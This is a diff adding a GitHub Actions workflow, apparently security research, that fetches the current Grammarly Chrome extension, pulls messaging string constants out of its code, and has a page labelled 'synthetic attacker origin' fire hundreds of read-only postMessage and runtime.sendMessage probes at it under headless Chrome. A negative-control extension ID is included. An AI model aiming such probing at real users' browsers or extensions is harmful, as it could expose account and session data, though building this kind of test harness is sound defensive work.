@@ -1,0 +1,186 @@
+name: Temporary Grammarly extension attacker-origin bridge gate
+
+on:
+  push:
+    branches: [research/superhuman-crx-intake-20260808]
+    paths: [.github/workflows/superhuman-grammarly-extension-attacker-origin-gate-20260808.yml]
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  gate:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: {node-version: '22'}
+
+      - name: Download exact current extension and build safe payload corpus
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf extension-origin-gate
+          mkdir -p extension-origin-gate/raw extension-origin-gate/extracted extension-origin-gate/site extension-origin-gate/evidence chrome-profile
+          ID='kbfnbcaeplbcioakkpcpgfkobkghlhen'
+          URL="https://clients2.google.com/service/update2/crx?response=redirect&prod=chromium&prodversion=151.0.0.0&acceptformat=crx3&x=id%3D${ID}%26installsource%3Dondemand%26uc"
+          curl --fail --show-error --silent --location --retry 4 --retry-all-errors \
+            --user-agent 'Mozilla/5.0 Chrome/151.0.0.0' "$URL" -o extension-origin-gate/raw/current.crx
+          python3 - <<'PY'
+          from pathlib import Path
+          import struct, json, hashlib, re
+          root=Path('extension-origin-gate')
+          d=(root/'raw/current.crx').read_bytes()
+          if d[:4]!=b'Cr24' or struct.unpack_from('<I',d,4)[0]!=3: raise SystemExit('not CRX3')
+          n=struct.unpack_from('<I',d,8)[0]; (root/'raw/current.zip').write_bytes(d[12+n:])
+          (root/'evidence/crx.json').write_text(json.dumps({'sha256':hashlib.sha256(d).hexdigest(),'size':len(d)},indent=2)+'\n')
+          PY
+          unzip -q extension-origin-gate/raw/current.zip -d extension-origin-gate/extracted
+          python3 - <<'PY'
+          from pathlib import Path
+          import json,re
+          root=Path('extension-origin-gate'); src=root/'extracted'; ev=root/'evidence'
+          manifest=json.loads((src/'manifest.json').read_text())
+          # Extract exact string constants around messaging APIs.
+          strings=set(); contexts=[]
+          strrx=re.compile(r'["\']([^"\'\\\n]{2,160})["\']')
+          entryrx=re.compile(r'onMessageExternal|onConnectExternal|runtime\.onMessage|runtime\.onConnect|addEventListener\s*\(\s*["\']message["\']|postMessage\s*\(|bgRpc|launchAuthFlow',re.I)
+          for p in src.rglob('*'):
+            if not p.is_file() or p.stat().st_size>30_000_000 or p.suffix.lower() not in {'.js','.mjs','.cjs','.html'}: continue
+            text=p.read_text(errors='ignore')
+            for idx,m in enumerate(entryrx.finditer(text)):
+              if idx>=300: break
+              c=text[max(0,m.start()-1800):m.start()+5200]
+              contexts.append({'file':str(p.relative_to(src)),'offset':m.start(),'match':m.group(0),'context':c.replace('\n',' ')})
+              for s in strrx.findall(c):
+                low=s.lower()
+                if any(k in low for k in ['external:','rpc','auth','user','account','session','login','current','status','ping','changed-','grammarly','superhuman']): strings.add(s)
+          dangerous=('logout','delete','remove','send','enable','disable','write','update','clear','launch','create','set-','install','uninstall','revoke')
+          safe=[]
+          for s in sorted(strings):
+            low=s.lower()
+            if len(s)>120 or any(x in low for x in dangerous): continue
+            if any(k in low for k in ['current','get','read','status','ping','user','account','session','changed-user','external:','rpc','auth']): safe.append(s)
+          safe=safe[:100]
+          manual=['external:changed-user','ping','get-current-user','current-user','get-user','get-session','get-auth-state','auth-status','bgRpc']
+          constants=[]
+          for s in manual+safe:
+            if s not in constants: constants.append(s)
+          payloads=[]
+          for i,s in enumerate(constants):
+            rid=f'SH_PROBE_{i:03d}'
+            payloads += [
+              s,
+              {'type':s,'requestId':rid,'readOnly':True},
+              {'name':s,'requestId':rid,'readOnly':True},
+              {'event':s,'requestId':rid,'readOnly':True},
+              {'action':s,'requestId':rid,'readOnly':True},
+              {'method':s,'requestId':rid,'args':[],'readOnly':True},
+            ]
+          # Explicit non-mutating RPC shapes.
+          for method in ['ping','getCurrentUser','getUser','getSession','getAuthState','isLoggedIn','getAccount','status']:
+            payloads += [
+              {'type':'bgRpc','id':f'SH_RPC_{method}','method':method,'args':[]},
+              {'type':'bgRpc','id':f'SH_RPC_API_{method}','method':'api_'+method,'args':[]},
+              {'kind':'bgRpc','requestId':f'SH_KIND_{method}','module':'api','method':method,'args':[]},
+            ]
+          (ev/'manifest.json').write_text(json.dumps(manifest,indent=2)+'\n')
+          (ev/'bridge-contexts.json').write_text(json.dumps(contexts,indent=2)+'\n')
+          (ev/'safe-constants.json').write_text(json.dumps(constants,indent=2)+'\n')
+          (root/'site/payloads.json').write_text(json.dumps(payloads)+'\n')
+          (ev/'corpus.json').write_text(json.dumps({'constantCount':len(constants),'payloadCount':len(payloads)},indent=2)+'\n')
+          PY
+          cat > extension-origin-gate/site/attacker.html <<'HTML'
+          <!doctype html><meta charset="utf-8"><title>synthetic attacker origin</title>
+          <script>
+          globalThis.__result={href:location.href,chromeRuntimePresent:!!(globalThis.chrome&&chrome.runtime),responses:[],pageMessages:[],errors:[],started:Date.now()};
+          addEventListener('message',e=>{
+            let data; try{data=structuredClone(e.data)}catch(_){data=String(e.data)}
+            globalThis.__result.pageMessages.push({origin:e.origin,sameSource:e.source===window,data,at:Date.now()});
+          });
+          async function sendRuntime(extensionId,payload,index){
+            return new Promise(resolve=>{
+              try{
+                if(!(globalThis.chrome&&chrome.runtime&&chrome.runtime.sendMessage)){resolve({index,available:false});return}
+                chrome.runtime.sendMessage(extensionId,payload,response=>{
+                  const error=chrome.runtime.lastError&&chrome.runtime.lastError.message;
+                  resolve({index,available:true,error,response});
+                });
+              }catch(error){resolve({index,available:true,thrown:String(error)})}
+            })
+          }
+          globalThis.runProbe=async(extensionId)=>{
+            const payloads=await fetch('/payloads.json').then(r=>r.json());
+            // Window bridge probes.
+            for(let i=0;i<payloads.length;i++){
+              try{window.postMessage({__shProbe:true,index:i,payload:payloads[i]},'*')}catch(e){__result.errors.push(String(e))}
+            }
+            // Externally-connectable runtime probes, bounded and read-only.
+            for(let i=0;i<payloads.length;i++){
+              const r=await sendRuntime(extensionId,payloads[i],i); __result.responses.push(r);
+            }
+            await new Promise(r=>setTimeout(r,5000));
+            __result.finished=Date.now();return __result;
+          };
+          </script>
+          HTML
+
+      - name: Run exact Chrome extension gate with negative control
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd extension-origin-gate
+          python3 -m http.server 8765 --bind 127.0.0.1 --directory site > evidence/http.log 2>&1 &
+          HTTP_PID=$!
+          CHROME="$(command -v google-chrome-stable || command -v google-chrome || command -v chromium)"
+          "$CHROME" --no-sandbox --disable-dev-shm-usage --disable-gpu \
+            --remote-debugging-address=127.0.0.1 --remote-debugging-port=9222 \
+            --user-data-dir="$PWD/../chrome-profile" \
+            --disable-extensions-except="$PWD/extracted" --load-extension="$PWD/extracted" \
+            about:blank > evidence/chrome.log 2>&1 &
+          CHROME_PID=$!
+          trap 'kill "$CHROME_PID" "$HTTP_PID" 2>/dev/null || true' EXIT
+          for _ in $(seq 1 100); do curl -fsS http://127.0.0.1:9222/json/version > evidence/chrome-version.json && break; sleep .2; done
+          test -s evidence/chrome-version.json
+          node --experimental-websocket <<'NODE'
+          const fs=require('fs'),http=require('http');
+          const EXT='kbfnbcaeplbcioakkpcpgfkobkghlhen';
+          const get=(path,method='GET')=>new Promise((resolve,reject)=>{const q=http.request({host:'127.0.0.1',port:9222,path,method},r=>{let b='';r.on('data',c=>b+=c);r.on('end',()=>{if(r.statusCode<200||r.statusCode>=300)return reject(new Error(`${r.statusCode} ${b}`));try{resolve(JSON.parse(b))}catch(e){reject(e)}})});q.on('error',reject);q.end()});
+          class CDP{constructor(url){this.ws=new WebSocket(url);this.i=0;this.p=new Map();this.ready=new Promise((ok,no)=>{this.ws.onopen=ok;this.ws.onerror=no});this.ws.onmessage=e=>{const m=JSON.parse(String(e.data));if(m.id&&this.p.has(m.id)){const x=this.p.get(m.id);this.p.delete(m.id);m.error?x.no(new Error(JSON.stringify(m.error))):x.ok(m.result)}}}async send(method,params={}){await this.ready;const id=++this.i;const p=new Promise((ok,no)=>this.p.set(id,{ok,no}));this.ws.send(JSON.stringify({id,method,params}));return p}async eval(expr){const r=await this.send('Runtime.evaluate',{expression:expr,awaitPromise:true,returnByValue:true});if(r.exceptionDetails)throw new Error(JSON.stringify(r.exceptionDetails));return r.result.value}close(){try{this.ws.close()}catch{}}}
+          const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+          (async()=>{
+            const result={pass:false,extensionId:EXT,attackerOrigin:'http://127.0.0.1:8765',targetsBefore:await get('/json/list')};
+            let page;
+            try{
+              const target=await get('/json/new?'+encodeURIComponent('http://127.0.0.1:8765/attacker.html'),'PUT');page=new CDP(target.webSocketDebuggerUrl);await page.ready;await page.send('Page.enable');await page.send('Runtime.enable');await sleep(2500);
+              result.loadedUrl=await page.eval('location.href');
+              result.probe=await page.eval(`runProbe(${JSON.stringify(EXT)})`);
+              result.targetsAfter=await get('/json/list');
+              // Negative-control extension id must fail identically or more strongly.
+              result.negative=await page.eval(`(async()=>{return new Promise(resolve=>{try{chrome.runtime.sendMessage('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',{type:'ping'},r=>resolve({error:chrome.runtime.lastError&&chrome.runtime.lastError.message,response:r}))}catch(e){resolve({thrown:String(e)})}})})()`);
+              const pageMessages=(result.probe.pageMessages||[]).filter(x=>x.data && !(x.data.__shProbe===true));
+              const runtimeResponses=(result.probe.responses||[]).filter(x=>x.response!==undefined || (x.error && !/Receiving end does not exist|Could not establish connection|not exist/i.test(x.error)));
+              const extensionTargets=(result.targetsAfter||[]).filter(t=>String(t.url||'').startsWith('chrome-extension://'));
+              result.analysis={nonSelfPageMessageCount:pageMessages.length,meaningfulRuntimeResponseCount:runtimeResponses.length,extensionTargetCount:extensionTargets.length,pageMessages,runtimeResponses,extensionTargets};
+              result.pass=pageMessages.length>0 || runtimeResponses.length>0;
+            }catch(e){result.error=String(e&&e.stack||e)}finally{if(page)page.close();fs.writeFileSync('evidence/RESULT.json',JSON.stringify(result,null,2)+'\n')}
+            process.exit(result.pass?0:1);
+          })();
+          NODE
+          rc=$?
+          set -e
+          jq . evidence/RESULT.json
+          sha256sum extracted/manifest.json site/attacker.html site/payloads.json evidence/RESULT.json evidence/crx.json > evidence/SHA256SUMS.txt
+          exit "$rc"
+
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: grammarly-current-extension-attacker-origin-gate
+          path: extension-origin-gate/evidence/
+          if-no-files-found: warn
+          retention-days: 1
+          compression-level: 9
